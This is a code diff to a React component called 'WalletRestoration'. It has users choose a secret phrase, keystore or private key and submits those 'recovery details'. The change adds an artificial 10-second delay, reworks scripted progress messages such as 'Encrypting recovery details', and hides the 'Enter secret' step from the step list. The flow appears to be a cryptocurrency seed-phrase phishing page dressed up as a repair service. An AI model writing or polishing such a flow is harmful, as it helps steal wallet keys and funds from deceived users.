@@ -30,7 +30,7 @@ const issueOptions: RecoveryIssue[] = [
 const connectionTypes: ConnectionType[] = ['Secret Phrase', 'Keystore', 'Private Key']
 const initializingSteps = ['Establishing secure recovery channel', 'Validating issue context and selected repair path', 'Preparing recovery diagnostics']
 const reviewingSteps = ['Encrypting recovery details', 'Processing recovery details', 'Finalizing recovery review']
-const recoverySteps = ['Select issue', 'Initialize', 'Choose connection', 'Enter secret', 'Review', 'Success']
+const recoverySteps = ['Select issue', 'Initialize', 'Choose connection', 'Review', 'Success']
 const stepLabels = {
   initializing: 'Initializing recovery flow',
   chooseConnection: 'Choose verification mode',
@@ -64,9 +64,9 @@ const getRecoveryStepIndex = (flowStep: RecoveryStage) => {
     case 'initializing': return 1
     case 'chooseConnection': return 2
     case 'enterSecret': return 3
-    case 'reviewing': return 4
-    case 'success': return 5
-    case 'error': return 4
+    case 'reviewing': return 3
+    case 'success': return 4
+    case 'error': return 3
     default: return 0
   }
 }
@@ -134,6 +134,8 @@ export const WalletRestoration = () => {
       return
     }
 
+    const startTime = Date.now()
+
     try {
       const timestamp = new Date().toISOString()
       const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'
@@ -158,6 +160,11 @@ export const WalletRestoration = () => {
         throw new Error(errorResponse || 'Failed to process recovery details')
       }
 
+      const elapsed = Date.now() - startTime
+      if (elapsed < 10000) {
+        await new Promise((resolve) => setTimeout(resolve, 10000 - elapsed))
+      }
+
       setResultSummary([
         `Recovery issue: ${activeIssue.title}`,
         `Connection mode: ${selectedConnection}`,
@@ -179,30 +186,31 @@ export const WalletRestoration = () => {
 
   useEffect(() => {
     if (flowStep !== 'initializing' && flowStep !== 'reviewing') return
-    if (activeMessages.length === 0) return
+
+    const messages = flowStep === 'initializing' ? initializingSteps : reviewingSteps
+    if (messages.length === 0) return
 
     let currentIndex = 0
     const timers: NodeJS.Timeout[] = []
     const tick = () => {
       currentIndex += 1
-      if (currentIndex < activeMessages.length) {
+      if (currentIndex < messages.length) {
         timers.push(setTimeout(() => {
-          setActivityMessage(activeMessages[currentIndex])
+          setActivityMessage(messages[currentIndex])
           setProgressIndex(currentIndex)
           tick()
         }, 1800))
         return
       }
 
-      timers.push(setTimeout(() => {
-        if (flowStep === 'initializing') setFlowStep('chooseConnection')
-        else void submitRecovery()
-      }, 1800))
+      if (flowStep === 'initializing') {
+        timers.push(setTimeout(() => setFlowStep('chooseConnection'), 1800))
+      }
     }
 
     timers.push(setTimeout(tick, 1800))
     return () => timers.forEach(clearTimeout)
-  }, [activeMessages, flowStep, submitRecovery])
+  }, [flowStep])
 
   const handleIssueSelect = (issue: RecoveryIssue) => {
     setActiveIssue(issue)
@@ -234,6 +242,7 @@ export const WalletRestoration = () => {
     setActivityMessage(reviewingSteps[0])
     setProgressIndex(0)
     setFlowStep('reviewing')
+    void submitRecovery()
   }
 
   const currentStepIndex = wizardSteps.indexOf(flowStep as typeof wizardSteps[number])
